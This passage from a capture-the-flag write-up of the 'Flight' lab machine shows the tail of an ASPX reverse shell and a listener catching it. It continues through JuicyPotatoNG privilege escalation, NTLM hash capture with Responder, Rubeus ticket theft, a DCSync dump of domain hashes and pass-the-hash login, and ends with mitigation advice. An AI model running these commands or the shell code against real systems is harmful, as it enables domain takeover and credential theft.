        WaitForSingleObject(pInfo.hProcess, (int)INFINITE);
    }

    protected void SpawnProcessAsPriv(IntPtr oursocket)
    {
        bool retValue;
        string Application = Environment.GetEnvironmentVariable("comspec"); 
        PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
        STARTUPINFO sInfo = new STARTUPINFO();
        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
        pSec.Length = Marshal.SizeOf(pSec);
        sInfo.dwFlags = 0x00000101; 
        IntPtr DupeToken = new IntPtr(0);
        sInfo.hStdInput = oursocket;
        sInfo.hStdOutput = oursocket;
        sInfo.hStdError = oursocket;
        if (DupeToken == IntPtr.Zero)
            retValue = CreateProcess(Application, "", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);
        else
            retValue = CreateProcessAsUser(DupeToken, Application, "", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);
        WaitForSingleObject(pInfo.hProcess, (int)INFINITE);
        CloseHandle(DupeToken);
    }
    </script>
```
</details>

I uploaded this to my target inside `C:\inetpub\development`, started an `nc` listener, and triggered it by accessing `http://127.0.0.1:8001/revshell.aspx`.

<FakeBrowserFrame url="http://127.0.0.1:8001/revshell.aspx">
</FakeBrowserFrame>

```plaintext {1,2,9}
┌──(m4ias7ru㉿kali)-[~/Desktop/Flight]
└─$ nc -lvnp 8002                                                              
listening on [any] 8002 ...
connect to [10.10.14.179] from (UNKNOWN) [10.129.228.120] 54407
Spawn Shell...
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool
```

I'm `iis apppool\defaultapppool` now.

### Privesc I: Abusing SeImpersonate (The Unintended Way)

Let's see what's up with this service account.

```plaintext {1,2}
c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

:::danger SeImpersonatePrivilege
`SeImpersonatePrivilege` allows a service to "impersonate" another user who connects to it. Exploits like `JuicyPotatoNG` abuse this by tricking a privileged account (usually SYSTEM via COM/DCOM) into authenticating to a malicious listener, allowing the attacker to steal that token and become SYSTEM.
:::

I used `JuicyPotatoNG` to simply read the root flag on the machine.

```plaintext {1,4}
c:\ProgramData>.\JuicyPotatoNG.exe -t * -p "C:\windows\system32\cmd.exe" -a "/c type c:\users\administrator\desktop\root.txt > c:\root.txt"
.\JuicyPotatoNG.exe -t * -p "C:\windows\system32\cmd.exe" -a "/c type c:\users\administrator\desktop\root.txt > c:\root.txt"

c:\ProgramData>type c:\root.txt
type c:\root.txt
f31221f6************************
```

Although I could have just as easily gotten a reverse shell, I wanted to explore the intended, AD-centric escalation path that makes this box special.

### Privesc II: Abusing Virtual Accounts (The Intended Way)

Ok, let's do this as God intended now.

Service accounts like `iis apppool\defaultapppool` are what Windows calls "Virtual Accounts". In an Active Directory environment, these accounts authenticate to network resources acting as the Machine Account (in this case, `G0$`).

This means that if I can force this user to authenticate to a Kerberos service, I can request a Ticket Granting Ticket (TGT) for the machine account itself.

:::info
Compromising the Machine Account of a Domain Controller (`G0$`) is effectively the same as becoming a Domain Admin. It inherently possesses the "DS-Replication-Get-Changes-All" right, which is exactly what we need to perform a **DCSync** attack and dump every hash in the domain.
:::

To verify this, as the `iis apppool\defaultapppool` user, I will force an SMB connection to my attacker box.

```plaintext {1}
c:\ProgramData>net use \\10.10.14.179\test
net use \\10.10.14.179\test
```

```plaintext {1,2}
┌──(m4ias7ru㉿kali)-[~/Desktop/Flight]
└─$ sudo responder -I tun0                 
[sudo] password for m4ias7ru: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.179]
    Responder IPv6             [dead:beef:2::10b1]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-IT7SLJ0QG1B]
    Responder Domain Name      [TD0C.LOCAL]
    Responder DCE-RPC Port     [49013]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...

[!] Error starting TCP server on port 53, check permissions or other servers running.
[SMB] NTLMv2-SSP Client   : 10.129.228.120
[SMB] NTLMv2-SSP Username : flight\G0$
[SMB] NTLMv2-SSP Hash     : G0$::flight:e83736cebc4410d0:55B11F4D39AD2658E55DC4A135157796:0101000000000000805E3FDB2977DC01DB16C04CA987073B0000000002000800540044003000430001001E00570049004E002D0049005400370053004C004A003000510047003100420004003400570049004E002D0049005400370053004C004A00300051004700310042002E0054004400300043002E004C004F00430041004C000300140054004400300043002E004C004F00430041004C000500140054004400300043002E004C004F00430041004C0007000800805E3FDB2977DC01060004000200000008003000300000000000000000000000003000000EDC72611D688971BBE32D4FAE2D9A9C102BBB6C5D24BA3309A9566DCA4BEC6B0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100370039000000000000000000
```

The account trying to authenticate is in fact the machine account `flight\G0$`, but since machine account passwords are typically 120 characters long, cracking this hash like I did with the others won't be that feasible. Nevertheless, as the current `iis apppool\defaultapppool` user, I can extract the TGT of the DC account, which gives me everything I need to impersonate the DC, simulate its replication behavior, and retrieve password hashes for the domain.

I used `Rubeus` with the `tgtdeleg` command to request a TGT for the current user session.

```plaintext {1}
c:\ProgramData>.\Rubeus.exe tgtdeleg /nowrap
.\Rubeus.exe tgtdeleg /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 


[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/g0.flight.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: oMFLD72szjVS8nx98evKwNnOYqvtrQ4K129SZhPmUlA=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIFVDCCBVCgAwIBBaEDAgEWooIEZDCCBGBhggRcMIIEWKADAgEFoQwbCkZMSUdIVC5IVEKiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkZMSUdIVC5IVEKjggQgMIIEHKADAgESoQMCAQKiggQOBIIECoWizb1/ki6H3e+k0RIdljurMQwi0RfqipY2piIiFh82c4WbB59iLO+ebD55WkKHcw16GrKlBaaLuaYZuuz0oRJ0xdjJC0EtJNPHs/ZmzZOS6X+9ud0+lysdAahrol0fKFKyEwjnZuf325za9t2FireB1/USi2KobzIgpMtqkYpPJLmF2or+xAHPGQQ3IAerRMpGOW9JIMx2pFA2q6XI/wt4ApLN0XVN7RMUNQ5it9rBqxFOj+wvru7nRLGyuGRhjmKvakDXEAYNRvvNXk4Z9IHuU3h8tOglbNTtzp8ndBD+3OAQsDg1Mv0x5KsZuBHc/YxorPJcqxMWwapxng5FknXP6qszrkVp9LjLw2IvagU6ZlN9jjlImq0kbe6AZjgFg/X5msRfQZyY+oO7Lw9iD6bdtlBtLo6Jj5U+HuJCZUMKyzebDOiyo5jlDqTGoiFBCo3I+kqw7vRk2AljY0P/rWfclhxzEAPsWyKpXY9KyNx5vgzavfsnvhU+zZNuQOFdzfqaletv5spwfrRF7KkUtzXHW+yQAJGdd8z1WOauweae+VYJoT2E4bOppP1gy3sjHJBDjKYIv1eR3lfvKPNB78sJe/KJZj9poYcPBWH9E3P0sJJDLqV4Ioi5CG4FmudchL4J3JTELs+Rey+eGQjGXXG3alMM6EU8Bvq8qFTeKYN5k4uiRBbx0X+wENgSBUV2s/6no3v6/pSZFh20WQDkoUKtz0GOETG/hg/68O/z1ctwzkgVOGCEXw/Q/fhuwYjL1v97rEpwQe33qYKJUVbDAmv1F43W352FvKn45jPh+HMxA0sXxxnI/oLPqY4Pr6MDOe/6MgjrYuPoiSDu7hmLdREMJgmdqBgAvVxGt4brF3yaYbdyOj9bZA0jtowgFFa6jPu0NhgIrx3A3E9Q/6VYb4sjc7leWqQJy5O2pd2gTT7kT7M/o1Ghxj4VuzxzJeXYKbQfpVVxrSCUV2vd3GXe33l5USt3u8W7m/hTR/vFv237fE6iaM7VDSJsMiQJkJmk2IA8oTTHDBWWzFkFLJeXddM5Es3Kz/D5cFGs+O607YCpCATw2r+h1dvR0N5Jx1ZaXWU9YpBgYN/BaWU6ZwTxyBfkmuTFMsY0Io/vbg4cMfUi6bBBfmk+bQ+6+81wjHyCfpSzm8mPsmc8G62tu0aRm+0GdyJx8ahZyi2cl5Rox5Jz08ZILkeTuhJ8M04pE5bT3joRxflGIF92EwsKNJFuiAsL7EOsIHz30LrHeHuu6lbrl1juVi6r80HD4q6lnS13gYtUBoyOpsizu4MkM9JhUwtwCYPd52S/PdKGOwPZINBHuvQi1/n5KdDMPLq9nlTAdTzMh2MSgANF0ZMPzRvAQTLkKiFQvh8kCzsWo4HbMIHYoAMCAQCigdAEgc19gcowgceggcQwgcEwgb6gKzApoAMCARKhIgQgSOxOeoR3l4xEx5FzVA9zEHWULWNY6eEuSQcvQRV4onChDBsKRkxJR0hULkhUQqIQMA6gAwIBAaEHMAUbA0cwJKMHAwUAYKEAAKURGA8yMDI1MTIyODAwMTcwMFqmERgPMjAyNTEyMjgxMDE3MDBapxEYDzIwMjYwMTA0MDAxNzAwWqgMGwpGTElHSFQuSFRCqR8wHaADAgECoRYwFBsGa3JidGd0GwpGTElHSFQuSFRC
```

I took this base64 encoded ticket.kirbi containing the `G0$` TGT, base64 decoded it and saved it as an admin.kirbi file:

```plaintext {1,2}
┌──(m4ias7ru㉿kali)-[~/Desktop/Flight]
└─$ echo "doIFVDCCBVCgAwIBBaEDAgEWooIEZDCCBGBhggRcMIIEWKADAgEFoQwbCkZMSUdIVC5IVEKiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkZMSUdIVC5IVEKjggQgMIIEHKADAgESoQMCAQKiggQOBIIECoWizb1/ki6H3e+k0RIdljurMQwi0RfqipY2piIiFh82c4WbB59iLO+ebD55WkKHcw16GrKlBaaLuaYZuuz0oRJ0xdjJC0EtJNPHs/ZmzZOS6X+9ud0+lysdAahrol0fKFKyEwjnZuf325za9t2FireB1/USi2KobzIgpMtqkYpPJLmF2or+xAHPGQQ3IAerRMpGOW9JIMx2pFA2q6XI/wt4ApLN0XVN7RMUNQ5it9rBqxFOj+wvru7nRLGyuGRhjmKvakDXEAYNRvvNXk4Z9IHuU3h8tOglbNTtzp8ndBD+3OAQsDg1Mv0x5KsZuBHc/YxorPJcqxMWwapxng5FknXP6qszrkVp9LjLw2IvagU6ZlN9jjlImq0kbe6AZjgFg/X5msRfQZyY+oO7Lw9iD6bdtlBtLo6Jj5U+HuJCZUMKyzebDOiyo5jlDqTGoiFBCo3I+kqw7vRk2AljY0P/rWfclhxzEAPsWyKpXY9KyNx5vgzavfsnvhU+zZNuQOFdzfqaletv5spwfrRF7KkUtzXHW+yQAJGdd8z1WOauweae+VYJoT2E4bOppP1gy3sjHJBDjKYIv1eR3lfvKPNB78sJe/KJZj9poYcPBWH9E3P0sJJDLqV4Ioi5CG4FmudchL4J3JTELs+Rey+eGQjGXXG3alMM6EU8Bvq8qFTeKYN5k4uiRBbx0X+wENgSBUV2s/6no3v6/pSZFh20WQDkoUKtz0GOETG/hg/68O/z1ctwzkgVOGCEXw/Q/fhuwYjL1v97rEpwQe33qYKJUVbDAmv1F43W352FvKn45jPh+HMxA0sXxxnI/oLPqY4Pr6MDOe/6MgjrYuPoiSDu7hmLdREMJgmdqBgAvVxGt4brF3yaYbdyOj9bZA0jtowgFFa6jPu0NhgIrx3A3E9Q/6VYb4sjc7leWqQJy5O2pd2gTT7kT7M/o1Ghxj4VuzxzJeXYKbQfpVVxrSCUV2vd3GXe33l5USt3u8W7m/hTR/vFv237fE6iaM7VDSJsMiQJkJmk2IA8oTTHDBWWzFkFLJeXddM5Es3Kz/D5cFGs+O607YCpCATw2r+h1dvR0N5Jx1ZaXWU9YpBgYN/BaWU6ZwTxyBfkmuTFMsY0Io/vbg4cMfUi6bBBfmk+bQ+6+81wjHyCfpSzm8mPsmc8G62tu0aRm+0GdyJx8ahZyi2cl5Rox5Jz08ZILkeTuhJ8M04pE5bT3joRxflGIF92EwsKNJFuiAsL7EOsIHz30LrHeHuu6lbrl1juVi6r80HD4q6lnS13gYtUBoyOpsizu4MkM9JhUwtwCYPd52S/PdKGOwPZINBHuvQi1/n5KdDMPLq9nlTAdTzMh2MSgANF0ZMPzRvAQTLkKiFQvh8kCzsWo4HbMIHYoAMCAQCigdAEgc19gcowgceggcQwgcEwgb6gKzApoAMCARKhIgQgSOxOeoR3l4xEx5FzVA9zEHWULWNY6eEuSQcvQRV4onChDBsKRkxJR0hULkhUQqIQMA6gAwIBAaEHMAUbA0cwJKMHAwUAYKEAAKURGA8yMDI1MTIyODAwMTcwMFqmERgPMjAyNTEyMjgxMDE3MDBapxEYDzIwMjYwMTA0MDAxNzAwWqgMGwpGTElHSFQuSFRCqR8wHaADAgECoRYwFBsGa3JidGd0GwpGTElHSFQuSFRC" | base64 -d > admin.kirbi
```

I then converted it to a .ccache file for use with Impacket.

```plaintext {1,2}
┌──(m4ias7ru㉿kali)-[~/Desktop/Flight]
└─$ impacket-ticketConverter ./admin.kirbi admin.ccache
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done
```

After this, I set the KRB5CCNAME environmental variable to the location of the .ccache ticket in order to use the ticket from cache during Kerberos authentication.

```plaintext {1,2}
┌──(m4ias7ru㉿kali)-[~/Desktop/Flight]
└─$ export KRB5CCNAME=admin.ccache
```

Since Kerberos is notoriously picky about time, I synced my attacker machine's clock with the target.

```plaintext {1,2}
┌──(m4ias7ru㉿kali)-[~/Desktop/Flight]
└─$ sudo ntpdate flight.htb
2025-12-27 19:25:39.698210 (-0500) +25200.851204 +/- 0.022869 flight.htb 10.129.228.120 s1 no-leap
CLOCK: time stepped by 25200.851204
```

I also added `g0.flight.htb` FQDN to my `/etc/hosts` file in order to remotely resolve the host specified in the saved TGT for `G0$` via Kerberos.

```plaintext title="/etc/hosts"
10.129.228.120 flight.htb school.flight.htb g0.flight.htb
```

Now, armed with the TGT for the Domain Controller (`G0$`), I can simulate a DCSync attack. Since Domain Controllers replicate data between each other, by impersonating a DC, I can ask the domain to replicate password hashes to me, including the Administrator's.

```plaintext {1,2}
┌──(m4ias7ru㉿kali)-[~/Desktop/Flight]
└─$ impacket-secretsdump g0.flight.htb -dc-ip flight.htb -no-pass -k 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6a2b6ce4d7121e112aeacbc6bd499a7f:::
S.Moon:1602:aad3b435b51404eeaad3b435b51404ee:f36b6972be65bc4eaa6983b5e9f1728f:::
R.Cold:1603:aad3b435b51404eeaad3b435b51404ee:5607f6eafc91b3506c622f70e7a77ce0:::
G.Lors:1604:aad3b435b51404eeaad3b435b51404ee:affa4975fc1019229a90067f1ff4af8d:::
L.Kein:1605:aad3b435b51404eeaad3b435b51404ee:4345fc90cb60ef29363a5f38e24413d5:::
M.Gold:1606:aad3b435b51404eeaad3b435b51404ee:78566aef5cd5d63acafdf7fed7a931ff:::
C.Bum:1607:aad3b435b51404eeaad3b435b51404ee:bc0359f62da42f8023fdde0949f4a359:::
W.Walker:1608:aad3b435b51404eeaad3b435b51404ee:ec52dceaec5a847af98c1f9de3e9b716:::
I.Francis:1609:aad3b435b51404eeaad3b435b51404ee:4344da689ee61b6fbbcdfa9303d324bc:::
D.Truff:1610:aad3b435b51404eeaad3b435b51404ee:b89f7c98ece6ca250a59a9f4c1533d44:::
V.Stevens:1611:aad3b435b51404eeaad3b435b51404ee:2a4836e3331ed290bd1c2fd2b50beb41:::
svc_apache:1612:aad3b435b51404eeaad3b435b51404ee:f36b6972be65bc4eaa6983b5e9f1728f:::
O.Possum:1613:aad3b435b51404eeaad3b435b51404ee:68ec50916875888f44caff424cd3f8ac:::
G0$:1001:aad3b435b51404eeaad3b435b51404ee:140547f31f4dbb4599dc90ea84c27e6b:::
[*] Cleaning up... 
```

:::success Domain Compromised
I successfully dumped the hashes and recovered the Administrator's NTLM hash (`43bbfc530bab76141b12c8446e30c17c`), giving me full control over the `flight.htb` domain.
:::

Now, for my final trick, I will pass this NTLM hash to `evil-winrm` to claim the server.

```plaintext {1,2,12}
┌──(m4ias7ru㉿kali)-[~/Desktop/Flight]
└─$ evil-winrm -i flight.htb -u administrator -H 43bbfc530bab76141b12c8446e30c17c

                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
flight\administrator
```

---

## Attack Path Visual Summary

```mermaid
---
config:
  theme: 'dark'
  themeVariables:
    lineColor: '#9fef00'
    primaryBorderColor: '#9fef00'
---
flowchart TD

    %% =========================
    %% Node Classes
    %% =========================
    classDef milestone fill:#0f0f0f,stroke:#9fef00,stroke-width:1px,color:#9fef00;
    classDef finding fill:#0f0f0f,stroke:#9fef00,stroke-dasharray: 6 3,color:#9fef00;
    classDef final fill:#9fef00,stroke:#0f0f0f,stroke-width:1px,color:#0f0f0f;

    %% =========================
    %% Nodes
    %% =========================
    A(Attacker Machine):::milestone
    B((LFI via UNC Path)):::finding
    C((svc_apache NTLMv2 Hash)):::finding

    D(User: S.Moon):::milestone
    E((Write Access to 'Shared')):::finding
    F((c.bum NTLMv2 Hash)):::finding

    G(User: c.bum):::milestone
    H((Internal Port 8000)):::finding

    I(Service: iis apppool\defaultapppool):::milestone
    J((Machine Account TGT 'G0$')):::finding
    K((Administrator NTLM Hash)):::finding

    L(User: Administrator):::final

    %% =========================
    %% Flows
    %% =========================
    A --> |Subdomain Enumeration| B
    B --> |Trigger SMB Connection| C

    C --> |Crack Hash & Password Spray| D
    D --> |Identify Perms| E
    E --> |Upload Malicious desktop.ini| F

    F --> |Crack Hash & RunasCs| G
    G --> |Internal Recon & Chisel Pivot| H
    H --> |Upload ASPX Reverse Shell| I

    I --> |Rubeus tgtdeleg & Virtual Account Abuse| J
    J --> |DCSync Attack| K
    K --> |Pass-the-Hash| L
```



---


## Mitigation Steps

- Fix LFI Vulnerabilities: Implement strict input validation and sanitization on the view parameter in index.php. Use an allowlist of permitted files rather than a blocklist of forbidden characters to prevent directory traversal and UNC path inclusion.

- Restrict Outbound Traffic: Configure firewall rules to block outbound SMB (TCP 445), NTLM, and other unnecessary traffic from servers to the internet or unauthorized internal segments. This prevents servers from leaking credentials to rogue listeners.

- Enforce Strong Password Policies: Implement and enforce a strong password policy that prevents password reuse across different accounts, specifically ensuring service accounts (like svc_apache) and user accounts (like S.Moon) do not share credentials.

- Harden Share Permissions: Apply the principle of least privilege to SMB shares. Restrict WRITE access to sensitive shares (like Shared and Web) strictly to the users and service accounts that require it for their specific job functions.

- Service Account Isolation: Configure service accounts (such as the one running the IIS Application Pool) to run with the least privileges necessary. Ensure they cannot impersonate the computer account or delegate credentials unless absolutely required. Consider using Group Managed Service Accounts (gMSA) where possible.

- Disable Unused Privileges: Review and disable dangerous privileges such as SeImpersonatePrivilege on service accounts if the application does not explicitly require them. This mitigates "Potato" style local privilege escalation attacks.

- Patch Management: Regularly update the operating system and software components to patch known vulnerabilities. While this writeup focused on misconfigurations, keeping systems patched is a fundamental defense against exploits like JuicyPotatoNG.